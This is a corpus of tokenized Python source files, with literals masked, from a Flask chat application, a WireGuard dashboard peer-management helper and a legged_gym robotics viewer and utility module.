: <EOL> remove_old_profile_picture ( ) <EOL> profile_picture = save_profile_picture ( form . profile_picture . data ) <EOL> current_user . profile_picture = profile_picture <EOL> update_user ( form . username . data , form . email . data ) <EOL> flash ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> return redirect ( url_for ( '<STR_LIT>' ) ) <EOL> elif request . method == '<STR_LIT>' : <EOL> form . username . data = current_user . username <EOL> form . email . data = current_user . email <EOL> return render_template ( '<STR_LIT>' , all_messages = all_messages , all_channels = all_channels , form = form ) <EOL> </s>
<s> from flask_wtf import FlaskForm <EOL> from wtforms import StringField , PasswordField , SubmitField , BooleanField <EOL> from wtforms . validators import DataRequired , Email <EOL> class LoginForm ( FlaskForm ) : <EOL> email = StringField ( '<STR_LIT>' , validators = [ DataRequired ( ) , Email ( ) ] ) <EOL> password = PasswordField ( '<STR_LIT>' , validators = [ DataRequired ( ) ] ) <EOL> remember = BooleanField ( '<STR_LIT>' ) <EOL> submit = SubmitField ( '<STR_LIT>' ) <EOL> </s>
<s> from flask import request , abort <EOL> from app . models import User <EOL> def check_token ( ) -> str : <EOL> token = request . values . get ( '<STR_LIT>' ) <EOL> if not token : <EOL> abort ( <NUM_LIT> , description = '<STR_LIT>' ) <EOL> else : <EOL> return token <EOL> def check_user ( token : str ) -> User : <EOL> user = User . verify_api_token ( token ) <EOL> if not user : <EOL> abort ( <NUM_LIT> , description = '<STR_LIT>' ) <EOL> else : <EOL> return user <EOL> </s>
<s> from datetime import datetime , timezone <EOL> from typing import Any , Optional , Tuple , List <EOL> from werkzeug . wrappers import Response <EOL> from flask import jsonify , url_for , redirect , flash <EOL> from flask_login import current_user <EOL> from app . models import db , ChannelAllowList , User , Channel <EOL> from app . models . channel_allowlist import UserRole <EOL> from app . bcrypt . utils import hash_password , check_hashed_password <EOL> from app . forms . channel import UpdateChannelForm , AddChannelForm , JoinChannelForm <EOL> def convert_time_to_string ( time : datetime ) -> str : <EOL> return time . replace ( tzinfo = timezone . utc ) . astimezone ( ) . strftime ( '<STR_LIT>' ) <EOL> def get_messages ( channel_name : str , counter : int ) -> Any : <EOL> num_messages_loaded_at_once = <NUM_LIT> <EOL> channel = Channel . query . filter_by ( name = channel_name ) . first ( ) <EOL> messages = channel . messages <EOL> messages_response = [ <EOL> { <EOL> '<STR_LIT>' : User . query . filter_by ( id = message . author_id ) . first ( ) . username , <EOL> '<STR_LIT>' : f"<STR_LIT>" <EOL> f"<STR_LIT>" , <EOL> '<STR_LIT>' : message . content , <EOL> '<STR_LIT>' : convert_time_to_string ( message . time ) <EOL> } <EOL> for message in messages [ max ( counter - num_messages_loaded_at_once , <NUM_LIT> ) : counter ] <EOL> ] <EOL> return jsonify ( { '<STR_LIT>' : messages_response } ) <EOL> def is_valid_channel ( channel : Optional [ Channel ] , form : AddChannelForm ) -> bool : <EOL> if isinstance ( channel , Channel ) : <EOL> return check_hashed_password ( channel . password , form . password . data ) <EOL> else : <EOL> return False <EOL> def process_add_channel_form ( form : AddChannelForm ) -> Response : <EOL> hashed_password = hash_password ( form . password . data ) <EOL> db . session . add ( Channel ( <EOL> name = form . name . data , password = hashed_password <EOL> ) ) <EOL> channel_id = Channel . query . filter_by ( password = hashed_password ) . first ( ) . id <EOL> db . session . add ( ChannelAllowList ( <EOL> channel_id = channel_id , user_id = current_user . id , user_role = UserRole . ADMIN . value <EOL> ) ) <EOL> db . session . commit ( ) <EOL> flash ( f'<STR_LIT>' , '<STR_LIT>' ) <EOL> return redirect ( url_for ( '<STR_LIT>' ) ) <EOL> def process_join_channel_form ( form : JoinChannelForm ) -> str : <EOL> channel = Channel . query . filter_by ( name = form . name . data ) . first ( ) <EOL> if is_valid_channel ( channel , form ) : <EOL> db . session . add ( ChannelAllowList ( <EOL> channel_id = channel . id , user_id = current_user . id <EOL> ) ) <EOL> db . session . commit ( ) <EOL> flash ( f'<STR_LIT>' , '<STR_LIT>' ) <EOL> else : <EOL> flash ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> return redirect ( url_for ( '<STR_LIT>' ) ) <EOL> def get_number_of_channels_users ( channel : Channel ) -> int : <EOL> return ChannelAllowList . query . filter_by ( channel_id = channel . id ) . count ( ) <EOL> def get_number_of_channels_messages ( channel : Channel ) -> int : <EOL> return len ( channel . messages ) <EOL> def get_channels_users ( channel : Channel ) -> List [ User ] : <EOL> channel_allowed_records = ChannelAllowList . query . filter_by ( channel_id = channel . id ) . all ( ) <EOL> return [ User . query . get ( record . user_id ) for record in channel_allowed_records ] <EOL> def is_admin ( channel : Channel , user : User ) -> bool : <EOL> allowed_record = ( ChannelAllowList . query . filter_by ( channel_id = channel . id ) <EOL> . filter_by ( user_id = user . id ) . first ( ) ) <EOL> return allowed_record and allowed_record . user_role == UserRole . ADMIN . value <EOL> def check_channel_settings_form ( channel_id : str , user_id : str ) -> Optional [ Tuple [ Channel , User ] ] : <EOL> if not channel_id or not user_id : <EOL> return None <EOL> try : <EOL> channel_id = int ( channel_id ) <EOL> user_id = int ( user_id ) <EOL> except ValueError : <EOL> return None <EOL> channel = Channel . query . get ( channel_id ) <EOL> if not channel : <EOL> return None <EOL> user = User . query . get ( user_id ) <EOL> if not ( user and is_admin ( channel , current_user ) ) : <EOL> return None <EOL> else : <EOL> return channel , user <EOL> def admin_manager ( command : str , channel_id : str , user_id : str ) : <EOL> checked_value = check_channel_settings_form ( channel_id , user_id ) <EOL> if not checked_value : <EOL> return admin_invalid ( ) <EOL> else : <EOL> channel , user = checked_value <EOL> allow_record = ( ChannelAllowList . query . filter_by ( channel_id = channel_id ) <EOL> . filter_by ( user_id = user_id ) . first ( ) ) <EOL> if not allow_record : <EOL> return admin_invalid ( ) <EOL> if command == '<STR_LIT>' : <EOL> allow_record . user_role = UserRole . ADMIN . value <EOL> db . session . commit ( ) <EOL> message = '<STR_LIT>' <EOL> elif command == '<STR_LIT>' : <EOL> allow_record . user_role = UserRole . NORMAL_USER . value <EOL> db . session . commit ( ) <EOL> message = '<STR_LIT>' <EOL> else : <EOL> return admin_invalid ( ) <EOL> flash ( f'<STR_LIT>' , '<STR_LIT>' ) <EOL> return redirect ( f'<STR_LIT>' ) <EOL> def admin_invalid ( ) -> str : <EOL> flash ( "<STR_LIT>" , '<STR_LIT>' ) <EOL> return redirect ( url_for ( '<STR_LIT>' ) ) <EOL> def no_channel ( ) -> str : <EOL> flash ( "<STR_LIT>" , '<STR_LIT>' ) <EOL> return redirect ( url_for ( '<STR_LIT>' ) ) <EOL> </s>
<s> import re <EOL> import subprocess <EOL> import dashboard <EOL> def regex_match ( regex , text ) : <EOL> pattern = re . compile ( regex ) <EOL> return pattern . search ( text ) is not None <EOL> def check_IP ( ip ) : <EOL> ip_patterns = ( <EOL> r"<STR_LIT>" , <EOL> r"<STR_LIT>" <EOL> ) <EOL> for match_pattern in ip_patterns : <EOL> match_result = regex_match ( match_pattern , ip ) <EOL> if match_result : <EOL> result = match_result <EOL> break <EOL> else : <EOL> result = None <EOL> return result <EOL> def clean_IP ( ip ) : <EOL> return ip . replace ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> def clean_IP_with_range ( ip ) : <EOL> return clean_IP ( ip ) . split ( '<STR_LIT>' ) <EOL> def check_IP_with_range ( ip ) : <EOL> ip_patterns = ( <EOL> r"<STR_LIT>" , <EOL> r"<STR_LIT>" <EOL> ) <EOL> for match_pattern in ip_patterns : <EOL> match_result = regex_match ( match_pattern , ip ) <EOL> if match_result : <EOL> result = match_result <EOL> break <EOL> else : <EOL> result = None <EOL> return result <EOL> def check_Allowed_IPs ( ip ) : <EOL> ip = clean_IP_with_range ( ip ) <EOL> for i in ip : <EOL> if not check_IP_with_range ( i ) : return False <EOL> return True <EOL> def check_DNS ( dns ) : <EOL> dns = dns . replace ( '<STR_LIT>' , '<STR_LIT>' ) . split ( '<STR_LIT>' ) <EOL> status = True <EOL> for i in dns : <EOL> if not ( check_IP ( i ) or regex_match ( "<STR_LIT>" , i ) ) : <EOL> return False <EOL> return True <EOL> def check_remote_endpoint ( address ) : <EOL> return ( check_IP ( address ) or regex_match ( "<STR_LIT>" , <EOL> address ) ) <EOL> def deletePeers ( config_name , delete_keys , cur , db ) : <EOL> sql_command = [ ] <EOL> wg_command = [ "<STR_LIT>" , "<STR_LIT>" , config_name ] <EOL> for delete_key in delete_keys : <EOL> if delete_key not in dashboard . get_conf_peer_key ( config_name ) : <EOL> return "<STR_LIT>" <EOL> sql_command . append ( "<STR_LIT>" + config_name + "<STR_LIT>" + delete_key + "<STR_LIT>" ) <EOL> wg_command . append ( "<STR_LIT>" ) <EOL> wg_command . append ( delete_key ) <EOL> wg_command . append ( "<STR_LIT>" ) <EOL> try : <EOL> print ( "<STR_LIT>" ) <EOL> remove_wg = subprocess . check_output ( "<STR_LIT>" . join ( wg_command ) , <EOL> shell = True , stderr = subprocess . STDOUT ) <EOL> save_wg = subprocess . check_output ( f"<STR_LIT>" , shell = True , stderr = subprocess . STDOUT ) <EOL> cur . executescript ( '<STR_LIT>' . join ( sql_command ) ) <EOL> db . commit ( ) <EOL> except subprocess . CalledProcessError as exc : <EOL> return exc . output . strip ( ) <EOL> return "<STR_LIT>" <EOL> def checkJSONAllParameter ( required , data ) : <EOL> if len ( data ) == <NUM_LIT> : <EOL> return False <EOL> for i in required : <EOL> if i not in list ( data . keys ( ) ) or len ( data [ i ] ) == <NUM_LIT> : <EOL> return False <EOL> return True <EOL> </s>
<s> from flask_bcrypt import Bcrypt <EOL> bcrypt = Bcrypt ( ) <EOL> </s>
<s> from . base import ma <EOL> from app . models import Channel <EOL> from . channel_allowlist import ChannelAllowListSchema <EOL> from . message import MessageSchema <EOL> class ChannelSchema ( ma . SQLAlchemySchema ) : <EOL> class Meta : <EOL> model = Channel <EOL> ordered = True <EOL> name = ma . auto_field ( ) <EOL> allowed_users = ma . Nested ( ChannelAllowListSchema , many = True ) <EOL> messages = ma . Nested ( MessageSchema , many = True ) <EOL> </s>
<s> from flask import Flask <EOL> from . base import ma <EOL> from . channel import ChannelSchema <EOL> from . channel_allowlist import ChannelAllowListSchema <EOL> from . message import MessageSchema <EOL> from . user import UserSchema <EOL> def init_app ( app : Flask ) -> None : <EOL> ma . init_app ( app ) <EOL> </s>
<s> from flask_sqlalchemy import SQLAlchemy <EOL> db = SQLAlchemy ( ) <EOL> </s>
<s> from flask import Flask <EOL> from typing import Optional <EOL> from . base import login_manager <EOL> from app . models . user import User <EOL> def init_app ( app : Flask ) -> None : <EOL> login_manager . init_app ( app ) <EOL> login_manager . login_view = '<STR_LIT>' <EOL> login_manager . login_message_category = '<STR_LIT>' <EOL> @ login_manager . user_loader <EOL> def load_user ( user_id : str ) -> Optional [ User ] : <EOL> user : Optional [ User ] = User . query . get ( int ( user_id ) ) <EOL> return user <EOL> </s>
<s> from flask import Blueprint <EOL> login = Blueprint ( '<STR_LIT>' , __name__ ) <EOL> </s>
<s> from flask_wtf import FlaskForm <EOL> from sqlalchemy import func <EOL> from wtforms import StringField , SubmitField , ValidationError <EOL> from flask_wtf . file import FileField , FileAllowed <EOL> from wtforms . validators import DataRequired , Length , Email <EOL> from flask_login import current_user <EOL> from app . models . user import User <EOL> class UpdateProfileForm ( FlaskForm ) : <EOL> username = StringField ( '<STR_LIT>' , validators = [ DataRequired ( ) , Length ( min = <NUM_LIT> , max = <NUM_LIT> ) ] ) <EOL> email = StringField ( '<STR_LIT>' , validators = [ DataRequired ( ) , Email ( ) ] ) <EOL> profile_picture = FileField ( '<STR_LIT>' , validators = [ FileAllowed ( [ '<STR_LIT>' , '<STR_LIT>' ] , '<STR_LIT>' ) ] ) <EOL> submit = SubmitField ( '<STR_LIT>' ) <EOL> def validate_username ( self , username : StringField ) -> None : <EOL> user = User . query . filter ( func . lower ( User . username ) == func . lower ( username . data ) ) . first ( ) <EOL> if user != current_user : <EOL> if user : <EOL> raise ValidationError ( '<STR_LIT>' ) <EOL> def validate_email ( self , email : StringField ) -> None : <EOL> user = User . query . filter ( func . lower ( User . email ) == func . lower ( email . data ) ) . first ( ) <EOL> if user != current_user : <EOL> if user : <EOL> raise ValidationError ( '<STR_LIT>' ) <EOL> </s>
<s> from flask import Flask <EOL> from . base import bcrypt <EOL> def init_app ( app : Flask ) -> None : <EOL> bcrypt . init_app ( app ) <EOL> </s>
<s> from app import socket_io , app <EOL> def run ( ) -> None : <EOL> socket_io . run ( app , host = '<STR_LIT>' , port = <NUM_LIT> , debug = False ) <EOL> if __name__ == '<STR_LIT>' : <EOL> run ( ) <EOL> </s>
<s> from flask_login import LoginManager <EOL> login_manager = LoginManager ( ) <EOL> </s>
<s> import os <EOL> LEGGED_GYM_ROOT_DIR = os . path . dirname ( os . path . dirname ( os . path . realpath ( __file__ ) ) ) <EOL> LEGGED_GYM_ENVS_DIR = os . path . join ( LEGGED_GYM_ROOT_DIR , '<STR_LIT>' , '<STR_LIT>' ) <EOL> </s>
<s> from typing import List , Optional <EOL> import logging <EOL> import math <EOL> import threading <EOL> import numpy as np <EOL> import torch <EOL> from legged_gym import LEGGED_GYM_ROOT_DIR <EOL> import os <EOL> try : <EOL> import flask <EOL> except ImportError : <EOL> flask = None <EOL> try : <EOL> import imageio <EOL> import isaacgym <EOL> import isaacgym . torch_utils as torch_utils <EOL> from isaacgym import gymapi <EOL> except ImportError : <EOL> imageio = None <EOL> isaacgym = None <EOL> torch_utils = None <EOL> gymapi = None <EOL> def cartesian_to_spherical ( x , y , z ) : <EOL> r = np . sqrt ( x ** <NUM_LIT> + y ** <NUM_LIT> + z ** <NUM_LIT> ) <EOL> theta = np . arccos ( z / r ) if r != <NUM_LIT> else <NUM_LIT> <EOL> phi = np . arctan2 ( y , x ) <EOL> return r , theta , phi <EOL> def spherical_to_cartesian ( r , theta , phi ) : <EOL> x = r * np . sin ( theta ) * np . cos ( phi ) <EOL> y = r * np . sin ( theta ) * np . sin ( phi ) <EOL> z = r * np . cos ( theta ) <EOL> return x , y , z <EOL> class WebViewer : <EOL> def __init__ ( self , host : str = "<STR_LIT>" , port : int = <NUM_LIT> ) -> None : <EOL> self . _app = flask . Flask ( __name__ ) <EOL> self . _app . add_url_rule ( "<STR_LIT>" , view_func = self . _route_index ) <EOL> self . _app . add_url_rule ( "<STR_LIT>" , view_func = self . _route_stream ) <EOL> self . _app . add_url_rule ( "<STR_LIT>" , view_func = self . _route_stream_depth ) <EOL> self . _app . add_url_rule ( "<STR_LIT>" , view_func = self . _route_input_event , methods = [ "<STR_LIT>" ] ) <EOL> self . _log = logging . getLogger ( '<STR_LIT>' ) <EOL> self . _log . disabled = True <EOL> self . _app . logger . disabled = True <EOL> self . _image = None <EOL> self . _image_depth = None <EOL> self . _camera_id = <NUM_LIT> <EOL> self . _camera_type = gymapi . IMAGE_COLOR <EOL> self . _notified = False <EOL> self . _wait_for_page = True <EOL> self . _pause_stream = False <EOL> self . _event_load = threading . Event ( ) <EOL> self . _event_stream = threading . Event ( ) <EOL> self . _event_stream_depth = threading . Event ( ) <EOL> self . _thread = threading . Thread ( target = lambda : self . _app . run ( host = host , port = port , debug = False , use_reloader = False ) , daemon = True ) <EOL> self . _thread . start ( ) <EOL> print ( f"<STR_LIT>" ) <EOL> def _route_index ( self ) -> '<STR_LIT>' : <EOL> with open ( os . path . join ( LEGGED_GYM_ROOT_DIR , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ) , '<STR_LIT>' , encoding = '<STR_LIT>' ) as file : <EOL> template = file . read ( ) <EOL> self . _event_load . set ( ) <EOL> return flask . render_template_string ( template ) <EOL> def _route_stream ( self ) -> '<STR_LIT>' : <EOL> return flask . Response ( self . _stream ( ) , mimetype = '<STR_LIT>' ) <EOL> def _route_stream_depth ( self ) -> '<STR_LIT>' : <EOL> return flask . Response ( self . _stream_depth ( ) , mimetype = '<STR_LIT>' ) <EOL> def _route_input_event ( self ) -> '<STR_LIT>' : <EOL> data = flask . request . get_json ( ) <EOL> key , mouse = data . get ( "<STR_LIT>" , None ) , data . get ( "<STR_LIT>" , None ) <EOL> dx , dy , dz = data . get ( "<STR_LIT>" , None ) , data . get ( "<STR_LIT>" , None ) , data . get ( "<STR_LIT>" , None ) <EOL> transform = self . _gym . get_camera_transform ( self . _sim , <EOL> self . _envs [ self . _camera_id ] , <EOL> self . _cameras [ self . _camera_id ] ) <EOL> if mouse == "<STR_LIT>" : <EOL> r , theta , phi = cartesian_to_spherical ( * self . cam_pos_rel ) <EOL> r += <NUM_LIT> * dz <EOL> self . cam_pos_rel = spherical_to_cartesian ( r , theta , phi ) <EOL> elif mouse == "<STR_LIT>" : <EOL> dx *= <NUM_LIT> * math . pi / <NUM_LIT> <EOL> dy *= <NUM_LIT> * math . pi / <NUM_LIT> <EOL> r , theta , phi = cartesian_to_spherical ( * self . cam_pos_rel ) <EOL> theta -= dy <EOL> phi -= dx <EOL> self . cam_pos_rel = spherical_to_cartesian ( r , theta , phi ) <EOL> elif mouse == "<STR_LIT>" : <EOL> dx *= - <NUM_LIT> * math . pi / <NUM_LIT> <EOL> dy *= - <NUM_LIT> * math . pi / <NUM_LIT> <EOL> r , theta , phi = cartesian_to_spherical ( * self . cam_pos_rel ) <EOL> theta += dy <EOL> phi += dx <EOL> self . cam_pos_rel = spherical_to_cartesian ( r , theta , phi ) <EOL> elif key == <NUM_LIT> : <EOL> self . _camera_id = ( self . _camera_id - <NUM_LIT> ) % self . _env . num_envs <EOL> return flask . Response ( status = <NUM_LIT> ) <EOL> elif key == <NUM_LIT> : <EOL> self . _camera_id = ( self . _camera_id + <NUM_LIT> ) % self . _env . num_envs <EOL> return flask . Response ( status = <NUM_LIT> ) <EOL> elif key == <NUM_LIT> : <EOL> self . _pause_stream = not self . _pause_stream <EOL> return flask . Response ( status = <NUM_LIT> ) <EOL> elif key == <NUM_LIT> : <EOL> if self . _camera_type == gymapi . IMAGE_COLOR : <EOL> self . _camera_type = gymapi . IMAGE_DEPTH <EOL> elif self . _camera_type == gymapi . IMAGE_DEPTH : <EOL> self . _camera_type = gymapi . IMAGE_COLOR <EOL> return flask . Response ( status = <NUM_LIT> ) <EOL> else : <EOL> return flask . Response ( status = <NUM_LIT> ) <EOL> return flask . Response ( status = <NUM_LIT> ) <EOL> def _stream ( self ) -> bytes : <EOL> while True : <EOL> self . _event_stream . wait ( ) <EOL> image = imageio . imwrite ( "<STR_LIT>" , self . _image , format = "<STR_LIT>" ) <EOL> yield ( b'<STR_LIT>' <EOL> b'<STR_LIT>' + image + b'<STR_LIT>' ) <EOL> self . _event_stream . clear ( ) <EOL> self . _notified = False <EOL> def _stream_depth ( self ) -> bytes : <EOL> while self . _env . cfg . depth . use_camera : <EOL> self . _event_stream_depth . wait ( ) <EOL> image = imageio . imwrite ( "<STR_LIT>" , self . _image_depth , format = "<STR_LIT>" ) <EOL> yield ( b'<STR_LIT>' <EOL> b'<STR_LIT>' + image + b'<STR_LIT>' ) <EOL> self . _event_stream_depth . clear ( ) <EOL> def attach_view_camera ( self , i , env_handle , actor_handle , root_pos ) : <EOL> if True : <EOL> camera_props = gymapi . CameraProperties ( ) <EOL> camera_props . width = <NUM_LIT> <EOL> camera_props . height = <NUM_LIT> <EOL> camera_handle = self . _gym . create_camera_sensor ( env_handle , camera_props ) <EOL> self . _cameras . append ( camera_handle ) <EOL> cam_pos = root_pos + np . array ( [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] ) <EOL> self . _gym . set_camera_location ( camera_handle , env_handle , gymapi . Vec3 ( * cam_pos ) , gymapi . Vec3 ( * root_pos ) ) <EOL> def setup ( self , env ) -> None : <EOL> self . _gym = env . gym <EOL> self . _sim = env . sim <EOL> self . _envs = env . envs <EOL> self . _cameras = [ ] <EOL> self . _env = env <EOL> self . cam_pos_rel = np . array ( [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] ) <EOL> for i in range ( self . _env . num_envs ) : <EOL> root_pos = self . _env . root_states [ i , : <NUM_LIT> ] . cpu ( ) . numpy ( ) <EOL> self . attach_view_camera ( i , self . _envs [ i ] , self . _env . actor_handles [ i ] , root_pos ) <EOL> def render ( self , <EOL> fetch_results : bool = True , <EOL> step_graphics : bool = True , <EOL> render_all_camera_sensors : bool = True , <EOL> wait_for_page_load : bool = True ) -> None : <EOL> if self . _wait_for_page : <EOL> if wait_for_page_load : <EOL> if not self . _event_load . is_set ( ) : <EOL> print ( "<STR_LIT>" ) <EOL> self . _event_load . wait ( ) <EOL> self . _event_load . clear ( ) <EOL> self . _wait_for_page = False <EOL> if self . _pause_stream : <EOL> return <EOL> if self . _notified : <EOL> return <EOL> if fetch_results : <EOL> self . _gym . fetch_results ( self . _sim , True ) <EOL> if step_graphics : <EOL> self . _gym . step_graphics ( self . _sim ) <EOL> if render_all_camera_sensors : <EOL> self . _gym . render_all_camera_sensors ( self . _sim ) <EOL> image = self . _gym . get_camera_image ( self . _sim , <EOL> self . _envs [ self . _camera_id ] , <EOL> self . _cameras [ self . _camera_id ] , <EOL> self . _camera_type ) <EOL> if self . _camera_type == gymapi . IMAGE_COLOR : <EOL> self . _image = image . reshape ( image . shape [ <NUM_LIT> ] , - <NUM_LIT> , <NUM_LIT> ) [ ... , : <NUM_LIT> ] <EOL> elif self . _camera_type == gymapi . IMAGE_DEPTH : <EOL> self . _image = - image . reshape ( image . shape [ <NUM_LIT> ] , - <NUM_LIT> ) <EOL> minimum = <NUM_LIT> if np . isinf ( np . min ( self . _image ) ) else np . min ( self . _image ) <EOL> maximum = <NUM_LIT> if np . isinf ( np . max ( self . _image ) ) else np . max ( self . _image ) <EOL> self . _image = np . clip ( <NUM_LIT> - ( self . _image - minimum ) / ( maximum - minimum ) , <NUM_LIT> , <NUM_LIT> ) <EOL> self . _image = np . uint8 ( <NUM_LIT> * self . _image ) <EOL> else : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> if self . _env . cfg . depth . use_camera : <EOL> self . _image_depth = self . _env . depth_buffer [ self . _camera_id , - <NUM_LIT> ] . cpu ( ) . numpy ( ) + <NUM_LIT> <EOL> self . _image_depth = np . uint8 ( <NUM_LIT> * self . _image_depth ) <EOL> root_pos = self . _env . root_states [ self . _camera_id , : <NUM_LIT> ] . cpu ( ) . numpy ( ) <EOL> cam_pos = root_pos + self . cam_pos_rel <EOL> self . _gym . set_camera_location ( self . _cameras [ self . _camera_id ] , self . _envs [ self . _camera_id ] , gymapi . Vec3 ( * cam_pos ) , gymapi . Vec3 ( * root_pos ) ) <EOL> self . _event_stream . set ( ) <EOL> if self . _env . cfg . depth . use_camera : <EOL> self . _event_stream_depth . set ( ) <EOL> self . _notified = True <EOL> def ik ( jacobian_end_effector : torch . Tensor , <EOL> current_position : torch . Tensor , <EOL> current_orientation : torch . Tensor , <EOL> goal_position : torch . Tensor , <EOL> goal_orientation : Optional [ torch . Tensor ] = None , <EOL> damping_factor : float = <NUM_LIT> , <EOL> squeeze_output : bool = True ) -> torch . Tensor : <EOL> if goal_orientation is None : <EOL> goal_orientation = current_orientation <EOL> q = torch_utils . quat_mul ( goal_orientation , torch_utils . quat_conjugate ( current_orientation ) ) <EOL> error = torch . cat ( [ goal_position - current_position , <EOL> q [ : , <NUM_LIT> : <NUM_LIT> ] * torch . sign ( q [ : , <NUM_LIT> ] ) . unsqueeze ( - <NUM_LIT> ) ] , <EOL> dim = - <NUM_LIT> ) . unsqueeze ( - <NUM_LIT> ) <EOL> transpose = torch . transpose ( jacobian_end_effector , <NUM_LIT> , <NUM_LIT> ) <EOL> lmbda = torch . eye ( <NUM_LIT> , device = jacobian_end_effector . device ) * ( damping_factor ** <NUM_LIT> ) <EOL> if squeeze_output : <EOL> return ( transpose @ torch . inverse ( jacobian_end_effector @ transpose + lmbda ) @ error ) . squeeze ( dim = <NUM_LIT> ) <EOL> else : <EOL> return transpose @ torch . inverse ( jacobian_end_effector @ transpose + lmbda ) @ error <EOL> def print_arguments ( args ) : <EOL> print ( "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" ) <EOL> for a in args . __dict__ : <EOL> print ( f"<STR_LIT>" ) <EOL> def print_asset_options ( asset_options : '<STR_LIT>' , asset_name : str = "<STR_LIT>" ) : <EOL> attrs = [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , <EOL> "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , <EOL> "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , <EOL> "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , <EOL> "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] <EOL> print ( "<STR_LIT>" . format ( f"<STR_LIT>" if asset_name else "<STR_LIT>" ) ) <EOL> for attr in attrs : <EOL> print ( "<STR_LIT>" . format ( attr , getattr ( asset_options , attr ) if hasattr ( asset_options , attr ) else "<STR_LIT>" ) ) <EOL> if attr == "<STR_LIT>" and hasattr ( asset_options , attr ) and getattr ( asset_options , attr ) : <EOL> vhacd_attrs = [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , <EOL> "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , <EOL> "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] <EOL> print ( "<STR_LIT>" ) <EOL> for vhacd_attr in vhacd_attrs : <EOL> print ( "<STR_LIT>" . format ( vhacd_attr , getattr ( asset_options . vhacd_params , vhacd_attr ) if hasattr ( asset_options . vhacd_params , vhacd_attr ) else "<STR_LIT>" ) ) <EOL> def print_sim_components ( gym , sim ) : <EOL> print ( "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" , gym . get_env_count ( sim ) ) <EOL> print ( "<STR_LIT>" , gym . get_sim_actor_count ( sim ) ) <EOL> print ( "<STR_LIT>" , gym . get_sim_rigid_body_count ( sim ) ) <EOL> print ( "<STR_LIT>" , gym . get_sim_joint_count ( sim ) ) <EOL> print ( "<STR_LIT>" , gym . get_sim_dof_count ( sim ) ) <EOL> print ( "<STR_LIT>" , gym . get_sim_force_sensor_count ( sim ) ) <EOL> def print_env_components ( gym , env ) : <EOL> print ( "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" , gym . get_actor_count ( env ) ) <EOL> print ( "<STR_LIT>" , gym . get_env_rigid_body_count ( env ) ) <EOL> print ( "<STR_LIT>" , gym . get_env_joint_count ( env ) ) <EOL> print ( "<STR_LIT>" , gym . get_env_dof_count ( env ) ) <EOL> def print_actor_components ( gym , env , actor ) : <EOL> print ( "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" , gym . get_actor_rigid_body_count ( env , actor ) ) <EOL> print ( "<STR_LIT>" , gym . get_actor_joint_count ( env , actor ) ) <EOL> print ( "<STR_LIT>" , gym . get_actor_dof_count ( env , actor ) ) <EOL> print ( "<STR_LIT>" , gym . get_actor_actuator_count ( env , actor ) ) <EOL> print ( "<STR_LIT>" , gym . get_actor_rigid_shape_count ( env , actor ) ) <EOL> print ( "<STR_LIT>" , gym . get_actor_soft_body_count ( env , actor ) ) <EOL> print ( "<STR_LIT>" , gym . get_actor_tendon_count ( env , actor ) ) <EOL> def print_dof_properties ( gymapi , props ) : <EOL> print ( "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" , props [ "<STR_LIT>" ] ) <EOL> print ( "<STR_LIT>" , props [ "<STR_LIT>" ] ) <EOL> print ( "<STR_LIT>" , props [ "<STR_LIT>" ] ) <EOL> print ( "<STR_LIT>" , props [ "<STR_LIT>" ] ) <EOL> print ( "<STR_LIT>" . format ( int ( gymapi . DOF_MODE_NONE ) ) ) <EOL> print ( "<STR_LIT>" . format ( int ( gymapi . DOF_MODE_POS ) ) ) <EOL> print ( "<STR_LIT>" . format ( int ( gymapi . DOF_MODE_VEL ) ) ) <EOL> print ( "<STR_LIT>" . format ( int ( gymapi . DOF_MODE_EFFORT ) ) ) <EOL> print ( "<STR_LIT>" , props [ "<STR_LIT>" ] ) <EOL> print ( "<STR_LIT>" , props [ "<STR_LIT>" ] ) <EOL> print ( "<STR_LIT>" , props [ "<STR_LIT>" ] ) <EOL> print ( "<STR_LIT>" , props [ "<STR_LIT>" ] ) <EOL> print ( "<STR_LIT>" , props [ "<STR_LIT>" ] ) <EOL> print ( "<STR_LIT>" , props [ "<STR_LIT>" ] ) <EOL> def print_links_and_dofs ( gym , asset ) : <EOL> link_dict = gym . get_asset_rigid_body_dict ( asset ) <EOL> dof_dict = gym . get_asset_dof_dict ( asset ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" ) <EOL> for k in link_dict : <EOL> print ( f"<STR_LIT>" ) <EOL> print ( "<STR_LIT>" ) <EOL> for k in dof_dict : <EOL> print ( f"<STR_LIT>" ) <EOL> </s>
